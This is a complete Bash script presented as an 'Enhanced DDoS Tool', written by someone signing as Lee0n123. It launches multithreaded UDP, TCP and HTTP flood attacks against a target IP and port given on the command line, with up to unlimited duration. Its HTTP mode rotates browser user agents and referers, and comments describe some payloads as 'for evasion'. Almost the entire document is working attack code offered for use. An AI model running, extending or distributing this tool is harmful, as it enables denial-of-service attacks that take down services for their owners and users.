#!/bin/bash

# Enhanced Bash DDoS Tool by Lee0n123
# Improved version with better performance and features

set -euo pipefail
IFS=$'\n\t'

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Banner
show_banner() {
    clear
    echo -e "${RED}"
    echo "╔══════════════════════════════════════════╗"
    echo "║   ▄▄▄▄▄ ▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄ ▄▄▄▄▄     ║"
    echo "║    █    █  █ █     █     █  █   █       ║"
    echo "║    █    █▄▄█ █▄▄   █▄▄   █▄▄█   █       ║"
    echo "║    █    █  █ █     █     █  █   █       ║"
    echo "║    █    █  █ █▄▄▄▄ █▄▄▄▄ █  █   █       ║"
    echo "║                                            ║"
    echo "║   C0de By Lee0n123 - Enhanced Bash v2.0    ║"
    echo "╚══════════════════════════════════════════╝"
    echo -e "${NC}"
}

# Function to display help
show_help() {
    echo -e "${YELLOW}"
    echo "Enhanced DDoS Tool - Bash Version"
    echo "================================="
    echo -e "${NC}"
    echo "Usage: $0 [OPTIONS]"
    echo ""
    echo "Required:"
    echo "  -i, --ip        Target IP address"
    echo "  -p, --port      Target port"
    echo ""
    echo "Options:"
    echo "  -m, --mode      Attack mode: udp, tcp, syn, http (default: udp)"
    echo "  -t, --threads   Number of threads (default: 1000)"
    echo "  -d, --duration  Attack duration in seconds (0 = infinite)"
    echo "  -s, --size      Packet size in bytes (default: 1024)"
    echo "  -r, --rate      Packets per second per thread"
    echo "  -v, --verbose   Show detailed output"
    echo "  -h, --help      Show this help message"
    echo ""
    echo "Examples:"
    echo "  $0 -i 192.168.1.1 -p 80 -m udp -t 500"
    echo "  $0 -i example.com -p 443 -m http -d 60"
    echo ""
    exit 0
}

# Function to check dependencies
check_deps() {
    local deps=("nc" "curl" "ping" "timeout")
    local missing=()
    
    for dep in "${deps[@]}"; do
        if ! command -v "$dep" &> /dev/null; then
            missing+=("$dep")
        fi
    done
    
    if [[ ${#missing[@]} -gt 0 ]]; then
        echo -e "${RED}[!] Missing dependencies:${NC} ${missing[*]}"
        echo "Install them using:"
        echo "  Ubuntu/Debian: sudo apt install netcat curl iputils-ping coreutils"
        echo "  CentOS/RHEL: sudo yum install nc curl iputils timeout"
        exit 1
    fi
}

# Function to validate IP/hostname
validate_target() {
    local target="$1"
    
    # Check if it's an IP address
    if [[ "$target" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
        if ! ping -c 1 -W 1 "$target" &> /dev/null; then
            echo -e "${YELLOW}[!] Warning: IP $target is not responding to ping${NC}"
        fi
        return 0
    fi
    
    # Check if it's a domain
    if [[ "$target" =~ ^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$ ]]; then
        if ! host "$target" &> /dev/null; then
            echo -e "${RED}[!] Error: Cannot resolve hostname $target${NC}"
            exit 1
        fi
        return 0
    fi
    
    echo -e "${RED}[!] Error: Invalid target format${NC}"
    exit 1
}

# Generate random data efficiently
generate_data() {
    local size="$1"
    # Use /dev/urandom for better performance
    head -c "$size" /dev/urandom
}

# UDP Flood Attack
udp_flood() {
    local ip="$1"
    local port="$2"
    local thread_id="$3"
    local packet_size="${4:-1024}"
    local rate="${5:-0}"
    
    local prefixes=("[*]" "[!]" "[#]" "[+]" "[~]")
    local prefix="${prefixes[$RANDOM % ${#prefixes[@]}]}"
    
    # Generate data once and reuse
    local data
    data=$(generate_data "$packet_size")
    
    local count=0
    local start_time=$(date +%s)
    
    while [[ $RUNNING -eq 1 ]]; do
        # Use dd for faster data generation if needed
        if [[ "$packet_size" -gt 65507 ]]; then
            echo -e "${YELLOW}[!] Warning: UDP packets > 65507 bytes may be fragmented${NC}"
        fi
        
        # Send UDP packets
        if [[ "$rate" -gt 0 ]]; then
            # Rate-limited sending
            for ((i=0; i<rate; i++)); do
                echo "$data" | timeout 0.1 nc -u -w 0 "$ip" "$port" 2>/dev/null &
                ((count++))
            done
            sleep 1
        else
            # Maximum speed
            for ((i=0; i<100; i++)); do
                echo "$data" | nc -u -w 0 "$ip" "$port" 2>/dev/null &
            done
            ((count+=100))
        fi
        
        # Clean up background processes
        wait &>/dev/null
        
        # Periodic status update
        if [[ $((count % 1000)) -eq 0 ]]; then
            local current_time=$(date +%s)
            local elapsed=$((current_time - start_time))
            if [[ $elapsed -gt 0 ]]; then
                local pps=$((count / elapsed))
                echo -e "${GREEN}$prefix Thread $thread_id: Sent $count packets ($pps pps)${NC}"
            fi
        fi
    done
}

# TCP Flood Attack
tcp_flood() {
    local ip="$1"
    local port="$2"
    local thread_id="$3"
    
    local prefixes=("[*]" "[!]" "[#]" "[+]" "[~]")
    local prefix="${prefixes[$RANDOM % ${#prefixes[@]}]}"
    
    # Various TCP payloads for evasion
    local payloads=(
        "GET / HTTP/1.1\r\nHost: $ip\r\n\r\n"
        "POST / HTTP/1.1\r\nHost: $ip\r\nContent-Length: 0\r\n\r\n"
        "HEAD / HTTP/1.1\r\nHost: $ip\r\n\r\n"
        "OPTIONS / HTTP/1.1\r\nHost: $ip\r\n\r\n"
    )
    
    local count=0
    local start_time=$(date +%s)
    
    while [[ $RUNNING -eq 1 ]]; do
        # Create TCP connection
        if timeout 2 nc -w 1 "$ip" "$port" &>/dev/null; then
            # Send multiple requests per connection
            for ((i=0; i<10; i++)); do
                local payload="${payloads[$RANDOM % ${#payloads[@]}]}"
                echo -ne "$payload" | timeout 1 nc -w 1 "$ip" "$port" 2>/dev/null &
                ((count++))
            done
        fi
        
        # Clean up
        wait &>/dev/null
        
        # Status update
        if [[ $((count % 100)) -eq 0 ]] && [[ "$VERBOSE" -eq 1 ]]; then
            echo -e "${BLUE}$prefix Thread $thread_id: Established connections${NC}"
        fi
    done
}

# HTTP Flood Attack
http_flood() {
    local ip="$1"
    local port="$2"
    local thread_id="$3"
    
    local user_agents=(
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/537.36"
    )
    
    local referers=(
        "https://www.google.com/"
        "https://www.facebook.com/"
        "https://twitter.com/"
        "https://www.youtube.com/"
    )
    
    local paths=("/" "/index.html" "/api/v1/test" "/wp-admin" "/login" "/assets/main.js")
    
    local count=0
    local start_time=$(date +%s)
    
    while [[ $RUNNING -eq 1 ]]; do
        local ua="${user_agents[$RANDOM % ${#user_agents[@]}]}"
        local ref="${referers[$RANDOM % ${#referers[@]}]}"
        local path="${paths[$RANDOM % ${#paths[@]}]}"
        
        # Send HTTP request
        curl -s -k -X GET \
            -H "User-Agent: $ua" \
            -H "Referer: $ref" \
            -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" \
            -H "Accept-Language: en-US,en;q=0.5" \
            -H "Connection: keep-alive" \
            -H "Cache-Control: max-age=0" \
            --max-time 2 \
            "http://$ip:$port$path" > /dev/null 2>&1 &
        
        ((count++))
        
        # Rate limiting
        sleep 0.1
        
        # Status update
        if [[ $((count % 20)) -eq 0 ]] && [[ "$VERBOSE" -eq 1 ]]; then
            local current_time=$(date +%s)
            local elapsed=$((current_time - start_time))
            if [[ $elapsed -gt 0 ]]; then
                local rps=$((count / elapsed))
                echo -e "${GREEN}[+] Thread $thread_id: $count requests ($rps rps)${NC}"
            fi
        fi
    done
}

# Statistics monitor
monitor_stats() {
    local start_time=$(date +%s)
    
    echo -e "\n${YELLOW}[*] Starting attack monitor...${NC}"
    echo -e "${BLUE}[*] Press Ctrl+C to stop the attack${NC}\n"
    
    while [[ $RUNNING -eq 1 ]]; do
        local current_time=$(date +%s)
        local elapsed=$((current_time - start_time))
        
        # Calculate approximate total packets/requests
        local estimated_total=$((THREADS * elapsed * 100))
        
        echo -e "${GREEN}"
        echo "╔══════════════════════════════════════╗"
        echo "║           ATTACK STATISTICS          ║"
        echo "╠══════════════════════════════════════╣"
        echo "║  Target:   $IP:$PORT"
        echo "║  Mode:     $(echo "$MODE" | tr '[:lower:]' '[:upper:]')"
        echo "║  Threads:  $THREADS"
        echo "║  Duration: ${elapsed}s"
        echo "║  Estimated: $estimated_total packets"
        echo "╚══════════════════════════════════════╝"
        echo -e "${NC}"
        
        sleep 5
    done
}

# Signal handler for clean exit
cleanup() {
    echo -e "\n${RED}[!] Stopping attack...${NC}"
    RUNNING=0
    sleep 2
    echo -e "${YELLOW}[*] Cleaning up...${NC}"
    
    # Kill all background processes
    pkill -P $$ 2>/dev/null || true
    
    echo -e "${GREEN}[+] Attack stopped successfully${NC}"
    exit 0
}

# Trap signals
trap cleanup SIGINT SIGTERM

# Main execution
main() {
    # Parse arguments
    IP=""
    PORT=""
    MODE="udp"
    THREADS=1000
    DURATION=0
    PACKET_SIZE=1024
    RATE=0
    VERBOSE=0
    
    while [[ $# -gt 0 ]]; do
        case $1 in
            -i|--ip)
                IP="$2"
                shift 2
                ;;
            -p|--port)
                PORT="$2"
                shift 2
                ;;
            -m|--mode)
                MODE="$2"
                shift 2
                ;;
            -t|--threads)
                THREADS="$2"
                shift 2
                ;;
            -d|--duration)
                DURATION="$2"
                shift 2
                ;;
            -s|--size)
                PACKET_SIZE="$2"
                shift 2
                ;;
            -r|--rate)
                RATE="$2"
                shift 2
                ;;
            -v|--verbose)
                VERBOSE=1
                shift
                ;;
            -h|--help)
                show_help
                ;;
            *)
                echo -e "${RED}[!] Unknown option: $1${NC}"
                show_help
                ;;
        esac
    done
    
    # Validate required arguments
    if [[ -z "$IP" || -z "$PORT" ]]; then
        echo -e "${RED}[!] Error: IP and Port are required!${NC}"
        show_help
    fi
    
    # Validate mode
    case "$MODE" in
        udp|tcp|http|syn)
            # Valid modes
            ;;
        *)
            echo -e "${RED}[!] Error: Invalid mode '$MODE'${NC}"
            echo "Valid modes: udp, tcp, http, syn"
            exit 1
            ;;
    esac
    
    # Validate numeric arguments
    if ! [[ "$PORT" =~ ^[0-9]+$ ]] || [[ "$PORT" -lt 1 ]] || [[ "$PORT" -gt 65535 ]]; then
        echo -e "${RED}[!] Error: Invalid port number${NC}"
        exit 1
    fi
    
    if ! [[ "$THREADS" =~ ^[0-9]+$ ]] || [[ "$THREADS" -lt 1 ]]; then
        echo -e "${RED}[!] Error: Invalid thread count${NC}"
        exit 1
    fi
    
    # Show banner
    show_banner
    
    # Check dependencies
    check_deps
    
    # Validate target
    echo -e "${YELLOW}[*] Validating target...${NC}"
    validate_target "$IP"
    
    # Display attack configuration
    echo -e "${GREEN}"
    echo "╔══════════════════════════════════════╗"
    echo "║        ATTACK CONFIGURATION          ║"
    echo "╠══════════════════════════════════════╣"
    echo "║  Target:      $IP:$PORT"
    echo "║  Mode:        $MODE"
    echo "║  Threads:     $THREADS"
    echo "║  Duration:    $(if [[ $DURATION -eq 0 ]]; then echo "Infinite"; else echo "${DURATION}s"; fi)"
    echo "║  Packet Size: ${PACKET_SIZE} bytes"
    echo "║  Rate Limit:  $(if [[ $RATE -eq 0 ]]; then echo "Maximum"; else echo "${RATE} pps/thread"; fi)"
    echo "╚══════════════════════════════════════╝"
    echo -e "${NC}"
    
    # Confirmation
    if [[ "$VERBOSE" -eq 1 ]]; then
        read -p "Press Enter to start attack or Ctrl+C to cancel..."
    fi
    
    # Global running flag
    RUNNING=1
    
    # Start monitor in background
    monitor_stats &
    
    # Start attack threads
    echo -e "${YELLOW}[*] Starting $THREADS attack threads...${NC}"
    
    for ((i=1; i<=THREADS; i++)); do
        case "$MODE" in
            udp)
                udp_flood "$IP" "$PORT" "$i" "$PACKET_SIZE" "$RATE" &
                ;;
            tcp)
                tcp_flood "$IP" "$PORT" "$i" &
                ;;
            http)
                http_flood "$IP" "$PORT" "$i" &
                ;;
            syn)
                # SYN flood would require raw socket access (typically needs root)
                echo -e "${YELLOW}[!] SYN flood requires root privileges${NC}"
                echo -e "${YELLOW}[!] Falling back to TCP flood${NC}"
                tcp_flood "$IP" "$PORT" "$i" &
                ;;
        esac
        
        # Throttle thread creation
        if [[ $((i % 100)) -eq 0 ]]; then
            sleep 0.01
        fi
    done
    
    # Set duration if specified
    if [[ $DURATION -gt 0 ]]; then
        echo -e "${YELLOW}[*] Attack will run for $DURATION seconds${NC}"
        sleep "$DURATION"
        cleanup
    else
        # Wait indefinitely
        wait
    fi
}

# Run main function
main "$@"
